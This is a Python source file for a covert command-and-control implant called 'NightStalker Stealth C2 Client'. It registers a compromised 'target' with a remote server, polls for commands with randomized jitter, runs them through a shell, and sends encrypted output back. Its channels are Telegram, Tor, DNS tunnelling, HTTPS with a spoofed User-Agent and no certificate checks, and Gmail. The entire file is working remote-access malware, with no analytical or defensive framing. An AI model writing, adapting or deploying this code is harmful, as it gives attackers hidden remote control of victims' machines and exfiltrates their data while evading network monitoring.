#!/usr/bin/env python3
"""
NightStalker Stealth C2 Client - Covert client for targets
"""

import os
import sys
import json
import time
import base64
import subprocess
import platform
import socket
import requests
import threading
import random
import string
from typing import Dict, List, Optional, Any
from datetime import datetime
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add parent directory to path for imports
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from utils.crypto import StealthCrypto


class StealthC2Client:
    """Stealth C2 client for targets"""
    
    def __init__(self, target_id: str, channel_type: str, **channel_config):
        self.target_id = target_id
        self.channel_type = channel_type
        self.channel_config = channel_config
        self.crypto = StealthCrypto()
        self.running = False
        self.last_command_time = 0
        
        # System info
        self.system_info = self._get_system_info()
        
        # Initialize channel
        self.channel = self._init_channel()
    
    def _get_system_info(self) -> Dict[str, Any]:
        """Get system information"""
        return {
            'platform': platform.system(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'hostname': platform.node(),
            'username': os.getenv('USERNAME') or os.getenv('USER'),
            'pid': os.getpid(),
            'cwd': os.getcwd(),
            'python_version': platform.python_version()
        }
    
    def _init_channel(self):
        """Initialize C2 channel"""
        if self.channel_type == 'telegram':
            return TelegramClientChannel(self.target_id, self.crypto, **self.channel_config)
        elif self.channel_type == 'tor':
            return TorClientChannel(self.target_id, self.crypto, **self.channel_config)
        elif self.channel_type == 'dns':
            return DNSClientChannel(self.target_id, self.crypto, **self.channel_config)
        elif self.channel_type == 'https':
            return HTTPSClientChannel(self.target_id, self.crypto, **self.channel_config)
        elif self.channel_type == 'gmail':
            return GmailClientChannel(self.target_id, self.crypto, **self.channel_config)
        else:
            raise ValueError(f"Unknown channel type: {self.channel_type}")
    
    def start(self):
        """Start the C2 client"""
        self.running = True
        print(f"[C2] Starting stealth client for target: {self.target_id}")
        print(f"[C2] Channel: {self.channel_type}")
        print(f"[C2] System: {self.system_info['platform']} {self.system_info['architecture']}")
        
        # Register with C2 server
        self._register()
        
        # Start command loop
        while self.running:
            try:
                # Check for commands
                commands = self.channel.get_commands()
                
                for command in commands:
                    self._execute_command(command)
                
                # Sleep with jitter
                sleep_time = random.uniform(30, 120)  # 30-120 seconds
                time.sleep(sleep_time)
                
            except KeyboardInterrupt:
                print("\n[C2] Shutting down...")
                self.running = False
                break
            except Exception as e:
                print(f"[C2] Error in main loop: {e}")
                time.sleep(60)  # Wait before retrying
    
    def _register(self):
        """Register with C2 server"""
        try:
            registration_data = {
                'target_id': self.target_id,
                'system_info': self.system_info,
                'timestamp': datetime.now().isoformat(),
                'status': 'online'
            }
            
            self.channel.send_registration(registration_data)
            print(f"[C2] Registered with C2 server")
            
        except Exception as e:
            print(f"[C2] Registration failed: {e}")
    
    def _execute_command(self, command_data: Dict):
        """Execute received command"""
        try:
            command_id = command_data.get('id')
            command = command_data.get('command')
            
            print(f"[C2] Executing command: {command}")
            
            # Execute command
            result = self._run_command(command)
            
            # Send result back
            result_data = {
                'command_id': command_id,
                'target_id': self.target_id,
                'result': result,
                'timestamp': datetime.now().isoformat(),
                'status': 'completed'
            }
            
            self.channel.send_result(result_data)
            print(f"[C2] Command completed: {command_id}")
            
        except Exception as e:
            print(f"[C2] Command execution failed: {e}")
            
            # Send error result
            error_data = {
                'command_id': command_data.get('id'),
                'target_id': self.target_id,
                'error': str(e),
                'timestamp': datetime.now().isoformat(),
                'status': 'error'
            }
            
            self.channel.send_result(error_data)
    
    def _run_command(self, command: str) -> Dict[str, Any]:
        """Run system command"""
        try:
            # Execute command
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
            else:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    preexec_fn=os.setsid
                )
            
            # Get output with timeout
            try:
                stdout, stderr = process.communicate(timeout=300)  # 5 minute timeout
                return_code = process.returncode
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return_code = -1
            
            return {
                'stdout': stdout.decode('utf-8', errors='ignore'),
                'stderr': stderr.decode('utf-8', errors='ignore'),
                'return_code': return_code,
                'command': command
            }
            
        except Exception as e:
            return {
                'error': str(e),
                'command': command,
                'return_code': -1
            }
    
    def stop(self):
        """Stop the C2 client"""
        self.running = False
        self.channel.cleanup()


class BaseClientChannel:
    """Base class for client channels"""
    
    def __init__(self, target_id: str, crypto: StealthCrypto, **config):
        self.target_id = target_id
        self.crypto = crypto
        self.config = config
    
    def send_registration(self, registration_data: Dict):
        """Send registration data (to be implemented by subclasses)"""
        raise NotImplementedError
    
    def get_commands(self) -> List[Dict]:
        """Get commands from server (to be implemented by subclasses)"""
        raise NotImplementedError
    
    def send_result(self, result_data: Dict):
        """Send result to server (to be implemented by subclasses)"""
        raise NotImplementedError
    
    def cleanup(self):
        """Cleanup channel resources"""
        pass


class TelegramClientChannel(BaseClientChannel):
    """Telegram client channel"""
    
    def __init__(self, target_id: str, crypto: StealthCrypto, **config):
        super().__init__(target_id, crypto, **config)
        self.bot_token = config.get('bot_token')
        self.chat_id = config.get('chat_id')
        self.api_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.last_update_id = 0
    
    def send_registration(self, registration_data: Dict):
        """Send registration via Telegram"""
        try:
            encrypted_data = self.crypto.encrypt(json.dumps(registration_data))
            encoded_data = base64.b64encode(encrypted_data).decode()
            
            message = f"🔧 <b>System Registration</b>\nTarget: {self.target_id}\nData: {encoded_data[:30]}..."
            
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            
            response = requests.post(f"{self.api_url}/sendMessage", json=payload, timeout=10)
            return response.status_code == 200
            
        except Exception as e:
            print(f"[Telegram] Registration failed: {e}")
            return False
    
    def get_commands(self) -> List[Dict]:
        """Get commands from Telegram"""
        try:
            payload = {
                'offset': self.last_update_id + 1,
                'timeout': 5
            }
            
            response = requests.post(f"{self.api_url}/getUpdates", json=payload, timeout=15)
            
            if response.status_code != 200:
                return []
            
            updates = response.json().get('result', [])
            commands = []
            
            for update in updates:
                self.last_update_id = update['update_id']
                
                if 'message' in update and 'text' in update['message']:
                    message_text = update['message']['text']
                    
                    # Check if message contains command for this target
                    if self.target_id in message_text and 'command' in message_text.lower():
                        try:
                            command_data = self._extract_command_data(message_text)
                            if command_data:
                                commands.append(command_data)
                        except Exception as e:
                            print(f"[Telegram] Error processing command: {e}")
            
            return commands
            
        except Exception as e:
            print(f"[Telegram] Error getting commands: {e}")
            return []
    
    def send_result(self, result_data: Dict):
        """Send result via Telegram"""
        try:
            encrypted_data = self.crypto.encrypt(json.dumps(result_data))
            encoded_data = base64.b64encode(encrypted_data).decode()
            
            message = f"📊 <b>Command Result</b>\nTarget: {self.target_id}\nResult: {encoded_data[:30]}..."
            
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            
            response = requests.post(f"{self.api_url}/sendMessage", json=payload, timeout=10)
            return response.status_code == 200
            
        except Exception as e:
            print(f"[Telegram] Failed to send result: {e}")
            return False
    
    def _extract_command_data(self, message: str) -> Optional[Dict]:
        """Extract command data from message"""
        try:
            import re
            match = re.search(r'[A-Za-z0-9+/]{20,}={0,2}', message)
            if match:
                encoded_data = match.group()
                encrypted_data = base64.b64decode(encoded_data)
                decrypted_data = self.crypto.decrypt(encrypted_data)
                return json.loads(decrypted_data)
        except:
            pass
        return None


class TorClientChannel(BaseClientChannel):
    """Tor hidden service client channel"""
    
    def __init__(self, target_id: str, crypto: StealthCrypto, **config):
        super().__init__(target_id, crypto, **config)
        self.onion_address = config.get('onion_address')
        self.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
    
    def send_registration(self, registration_data: Dict):
        """Send registration via Tor"""
        try:
            encrypted_data = self.crypto.encrypt(json.dumps(registration_data))
            
            payload = {
                'target_id': self.target_id,
                'data': base64.b64encode(encrypted_data).decode(),
                'type': 'registration'
            }
            
            response = requests.post(
                f"http://{self.onion_address}/register",
                json=payload,
                proxies=self.proxies,
                timeout=30
            )
            
            return response.status_code == 200
            
        except Exception as e:
            print(f"[Tor] Registration failed: {e}")
            return False
    
    def get_commands(self) -> List[Dict]:
        """Get commands via Tor"""
        try:
            params = {'target_id': self.target_id}
            
            response = requests.get(
                f"http://{self.onion_address}/commands",
                params=params,
                proxies=self.proxies,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                commands = []
                
                for command in data.get('commands', []):
                    try:
                        encrypted_data = base64.b64decode(command['data'])
                        decrypted_data = self.crypto.decrypt(encrypted_data)
                        commands.append(json.loads(decrypted_data))
                    except Exception as e:
                        print(f"[Tor] Error decrypting command: {e}")
                
                return commands
            else:
                return []
                
        except Exception as e:
            print(f"[Tor] Error getting commands: {e}")
            return []
    
    def send_result(self, result_data: Dict):
        """Send result via Tor"""
        try:
            encrypted_data = self.crypto.encrypt(json.dumps(result_data))
            
            payload = {
                'target_id': self.target_id,
                'data': base64.b64encode(encrypted_data).decode(),
                'type': 'result'
            }
            
            response = requests.post(
                f"http://{self.onion_address}/result",
                json=payload,
                proxies=self.proxies,
                timeout=30
            )
            
            return response.status_code == 200
            
        except Exception as e:
            print(f"[Tor] Failed to send result: {e}")
            return False


class DNSClientChannel(BaseClientChannel):
    """DNS client channel"""
    
    def __init__(self, target_id: str, crypto: StealthCrypto, **config):
        super().__init__(target_id, crypto, **config)
        self.domain = config.get('domain')
        self.dns_server = config.get('dns_server', '8.8.8.8')
    
    def send_registration(self, registration_data: Dict):
        """Send registration via DNS"""
        try:
            encoded_data = self._encode_for_dns(registration_data)
            query = f"reg.{encoded_data}.{self.target_id}.{self.domain}"
            
            import dns.resolver
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_server]
            
            resolver.resolve(query, 'A')
            return True
            
        except Exception as e:
            print(f"[DNS] Registration failed: {e}")
            return False
    
    def get_commands(self) -> List[Dict]:
        """Get commands via DNS"""
        try:
            query = f"cmd.{self.target_id}.{self.domain}"
            
            import dns.resolver
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_server]
            
            answers = resolver.resolve(query, 'TXT')
            
            commands = []
            for answer in answers:
                try:
                    command_data = self._decode_from_dns(str(answer))
                    commands.append(command_data)
                except Exception as e:
                    print(f"[DNS] Error decoding command: {e}")
            
            return commands
            
        except Exception as e:
            print(f"[DNS] Error getting commands: {e}")
            return []
    
    def send_result(self, result_data: Dict):
        """Send result via DNS"""
        try:
            encoded_data = self._encode_for_dns(result_data)
            query = f"res.{encoded_data}.{self.target_id}.{self.domain}"
            
            import dns.resolver
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_server]
            
            resolver.resolve(query, 'A')
            return True
            
        except Exception as e:
            print(f"[DNS] Failed to send result: {e}")
            return False
    
    def _encode_for_dns(self, data: Dict) -> str:
        """Encode data for DNS transmission"""
        json_str = json.dumps(data)
        encrypted = self.crypto.encrypt(json_str)
        encoded = base64.b64encode(encrypted).decode()
        encoded = encoded.replace('+', '-').replace('/', '_').replace('=', '')
        return encoded[:63]
    
    def _decode_from_dns(self, dns_data: str) -> Dict:
        """Decode data from DNS transmission"""
        padding = 4 - (len(dns_data) % 4)
        if padding != 4:
            dns_data += '=' * padding
        
        dns_data = dns_data.replace('-', '+').replace('_', '/')
        encrypted = base64.b64decode(dns_data)
        decrypted = self.crypto.decrypt(encrypted)
        return json.loads(decrypted)


class HTTPSClientChannel(BaseClientChannel):
    """HTTPS client channel"""
    
    def __init__(self, target_id: str, crypto: StealthCrypto, **config):
        super().__init__(target_id, crypto, **config)
        self.server_url = config.get('server_url')
        self.api_key = config.get('api_key')
    
    def send_registration(self, registration_data: Dict):
        """Send registration via HTTPS"""
        try:
            encrypted_data = self.crypto.encrypt(json.dumps(registration_data))
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json',
                'Authorization': f'Bearer {self.api_key}'
            }
            
            payload = {
                'target_id': self.target_id,
                'data': base64.b64encode(encrypted_data).decode(),
                'type': 'registration'
            }
            
            response = requests.post(
                f"{self.server_url}/api/register",
                json=payload,
                headers=headers,
                timeout=30,
                verify=False
            )
            
            return response.status_code == 200
            
        except Exception as e:
            print(f"[HTTPS] Registration failed: {e}")
            return False
    
    def get_commands(self) -> List[Dict]:
        """Get commands via HTTPS"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json',
                'Authorization': f'Bearer {self.api_key}'
            }
            
            params = {'target_id': self.target_id}
            
            response = requests.get(
                f"{self.server_url}/api/commands",
                params=params,
                headers=headers,
                timeout=30,
                verify=False
            )
            
            if response.status_code == 200:
                data = response.json()
                commands = []
                
                for command in data.get('commands', []):
                    try:
                        encrypted_data = base64.b64decode(command['data'])
                        decrypted_data = self.crypto.decrypt(encrypted_data)
                        commands.append(json.loads(decrypted_data))
                    except Exception as e:
                        print(f"[HTTPS] Error decrypting command: {e}")
                
                return commands
            else:
                return []
                
        except Exception as e:
            print(f"[HTTPS] Error getting commands: {e}")
            return []
    
    def send_result(self, result_data: Dict):
        """Send result via HTTPS"""
        try:
            encrypted_data = self.crypto.encrypt(json.dumps(result_data))
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json',
                'Authorization': f'Bearer {self.api_key}'
            }
            
            payload = {
                'target_id': self.target_id,
                'data': base64.b64encode(encrypted_data).decode(),
                'type': 'result'
            }
            
            response = requests.post(
                f"{self.server_url}/api/result",
                json=payload,
                headers=headers,
                timeout=30,
                verify=False
            )
            
            return response.status_code == 200
            
        except Exception as e:
            print(f"[HTTPS] Failed to send result: {e}")
            return False


class GmailClientChannel(BaseClientChannel):
    """Gmail client channel"""
    
    def __init__(self, target_id: str, crypto: StealthCrypto, **config):
        super().__init__(target_id, crypto, **config)
        self.gmail_service = None
        self.user_id = config.get('user_id', 'me')
        self._setup_gmail()
    
    def _setup_gmail(self):
        """Setup Gmail service"""
        try:
            from google.oauth2.credentials import Credentials
            from google_auth_oauthlib.flow import InstalledAppFlow
            from google.auth.transport.requests import Request
            from googleapiclient.discovery import build
            import pickle
            import os.path
            
            SCOPES = ['https://www.googleapis.com/auth/gmail.modify']
            
            creds = None
            token_path = 'token.pickle'
            
            if os.path.exists(token_path):
                with open(token_path, 'rb') as token:
                    creds = pickle.load(token)
            
            if not creds or not creds.valid:
                if creds and creds.expired and creds.refresh_token:
                    creds.refresh(Request())
                else:
                    credentials_file = self.config.get('credentials_file')
                    if not credentials_file:
                        raise Exception("Gmail credentials file not provided")
                    
                    flow = InstalledAppFlow.from_client_secrets_file(credentials_file, SCOPES)
                    creds = flow.run_local_server(port=0)
                
                with open(token_path, 'wb') as token:
                    pickle.dump(creds, token)
            
            self.gmail_service = build('gmail', 'v1', credentials=creds)
            
        except Exception as e:
            print(f"[Gmail] Setup failed: {e}")
    
    def send_registration(self, registration_data: Dict):
        """Send registration via Gmail"""
        try:
            if not self.gmail_service:
                return False
            
            encrypted_data = self.crypto.encrypt(json.dumps(registration_data))
            encoded_data = base64.b64encode(encrypted_data).decode()
            
            message = self._create_email_message('registration', encoded_data)
            
            self.gmail_service.users().messages().send(
                userId=self.user_id,
                body=message
            ).execute()
            
            return True
            
        except Exception as e:
            print(f"[Gmail] Registration failed: {e}")
            return False
    
    def get_commands(self) -> List[Dict]:
        """Get commands via Gmail"""
        try:
            if not self.gmail_service:
                return []
            
            # Search for command emails
            query = f'subject:"System Command" from:nightstalker'
            results = self.gmail_service.users().messages().list(
                userId=self.user_id,
                q=query
            ).execute()
            
            messages = results.get('messages', [])
            commands = []
            
            for message in messages:
                try:
                    msg = self.gmail_service.users().messages().get(
                        userId=self.user_id,
                        id=message['id']
                    ).execute()
                    
                    command_data = self._extract_command_from_email(msg)
                    if command_data and command_data.get('target_id') == self.target_id:
                        commands.append(command_data)
                        
                except Exception as e:
                    print(f"[Gmail] Error processing email: {e}")
            
            return commands
            
        except Exception as e:
            print(f"[Gmail] Error getting commands: {e}")
            return []
    
    def send_result(self, result_data: Dict):
        """Send result via Gmail"""
        try:
            if not self.gmail_service:
                return False
            
            encrypted_data = self.crypto.encrypt(json.dumps(result_data))
            encoded_data = base64.b64encode(encrypted_data).decode()
            
            message = self._create_email_message('result', encoded_data)
            
            self.gmail_service.users().messages().send(
                userId=self.user_id,
                body=message
            ).execute()
            
            return True
            
        except Exception as e:
            print(f"[Gmail] Failed to send result: {e}")
            return False
    
    def _create_email_message(self, message_type: str, encoded_data: str) -> Dict:
        """Create email message"""
        import base64
        from email.mime.text import MIMEText
        
        if message_type == 'registration':
            subject = f"System Registration - {self.target_id}"
            body = f"""
System Registration Report

Target ID: {self.target_id}
Registration Data: {encoded_data[:30]}...
Timestamp: {datetime.now().isoformat()}

This is an automated system registration message.
"""
        else:
            subject = f"Command Result - {self.target_id}"
            body = f"""
Command Execution Result

Target ID: {self.target_id}
Result Data: {encoded_data[:30]}...
Timestamp: {datetime.now().isoformat()}

This is an automated command result message.
"""
        
        message = MIMEText(body)
        message['to'] = 'nightstalker@example.com'  # Configure as needed
        message['subject'] = subject
        
        return {'raw': base64.urlsafe_b64encode(message.as_bytes()).decode()}
    
    def _extract_command_from_email(self, email_message: Dict) -> Optional[Dict]:
        """Extract command from email"""
        try:
            if 'payload' in email_message:
                parts = email_message['payload'].get('parts', [])
                for part in parts:
                    if part['mimeType'] == 'text/plain':
                        data = part['body']['data']
                        body = base64.urlsafe_b64decode(data).decode()
                        
                        import re
                        match = re.search(r'[A-Za-z0-9+/]{20,}={0,2}', body)
                        if match:
                            encoded_data = match.group()
                            encrypted_data = base64.b64decode(encoded_data)
                            decrypted_data = self.crypto.decrypt(encrypted_data)
                            return json.loads(decrypted_data)
        except:
            pass
        return None


def main():
    """CLI entry point for stealth C2 client"""
    import argparse
    
    parser = argparse.ArgumentParser(description='NightStalker Stealth C2 Client')
    parser.add_argument('--target-id', required=True, help='Target ID')
    parser.add_argument('--channel', choices=['telegram', 'tor', 'dns', 'https', 'gmail'], 
                       required=True, help='C2 channel type')
    parser.add_argument('--bot-token', help='Telegram bot token')
    parser.add_argument('--chat-id', help='Telegram chat ID')
    parser.add_argument('--onion-address', help='Tor onion address')
    parser.add_argument('--domain', help='DNS domain')
    parser.add_argument('--server-url', help='HTTPS server URL')
    parser.add_argument('--api-key', help='API key')
    
    args = parser.parse_args()
    
    # Build channel config
    channel_config = {}
    if args.channel == 'telegram':
        channel_config['bot_token'] = args.bot_token
        channel_config['chat_id'] = args.chat_id
    elif args.channel == 'tor':
        channel_config['onion_address'] = args.onion_address
    elif args.channel == 'dns':
        channel_config['domain'] = args.domain
    elif args.channel == 'https':
        channel_config['server_url'] = args.server_url
        channel_config['api_key'] = args.api_key
    
    # Create and start client
    client = StealthC2Client(args.target_id, args.channel, **channel_config)
    
    try:
        client.start()
    except KeyboardInterrupt:
        print("\n[C2] Client stopped by user")
    finally:
        client.stop()


if __name__ == "__main__":
    main() 